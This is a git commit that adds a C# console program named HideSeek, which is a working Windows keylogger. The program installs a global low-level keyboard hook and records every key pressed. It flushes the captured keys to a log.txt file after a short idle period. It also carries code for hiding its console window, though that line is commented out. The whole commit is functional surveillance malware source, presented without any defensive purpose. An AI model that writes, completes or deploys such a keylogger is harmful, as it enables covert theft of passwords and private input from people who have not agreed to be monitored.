b3220c09f7fd7a5e51ab59222668ca9a9e97cbae
Denis Aguilar <denis.ragui@gmail.com>
2017-10-25 00:10:20 -0200

    Initial Commit.

---
+++ HideSeek/Program.cs
@@ -0,0 +1,120 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Threading;
+
+namespace HideSeek {
+    class Program {
+
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private const int BUFFER_DEFTIME = 5000;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        private static int _bufferTime = 5;
+        public static int BufferTime {
+            get { return _bufferTime; }
+            set {
+                _bufferTime = value;
+                if (_bufferTime == 0) {
+                    ReleaseBuffer();
+                }
+            }
+        }
+
+        private static StringBuilder buffer;
+
+        static void Main(string[] args) {
+
+            buffer = new StringBuilder();
+
+            var handle = GetConsoleWindow();
+
+            // Hide
+            //ShowWindow(handle, SW_HIDE);
+
+            _hookID = SetHook(_proc);
+
+            new Thread(() => {
+
+                do {
+                    if (BufferTime != 0) {
+                        Thread.Sleep(1000);
+                        BufferTime--;                       
+                    } else {
+                        Thread.Sleep(2 * 1000);                       
+                    }
+                } while (true);
+
+            }).Start();
+
+            Application.Run();
+            UnhookWindowsHookEx(_hookID);
+        }
+
+        private static void ReleaseBuffer() {
+            using (var sw = new StreamWriter(Application.StartupPath + @"\log.txt", true)) {
+                sw.WriteLine(buffer.ToString());
+                sw.Close();
+                buffer.Clear();
+            }
+        }
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+            BufferTime = 5;
+
+            Console.WriteLine(lParam);
+
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+                int vkCode = Marshal.ReadInt32(lParam);
+                KeysConverter kc = new KeysConverter();              
+                buffer.Append((Keys)vkCode);
+            }
+
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
+            using (Process curProcess = Process.GetCurrentProcess())
+
+            using (ProcessModule curModule = curProcess.MainModule) {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+            }
+
+        }
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        //These Dll's will handle the hooks. Yaaar mateys!
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        // The two dll imports below will handle the window hiding.
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+    }
+}
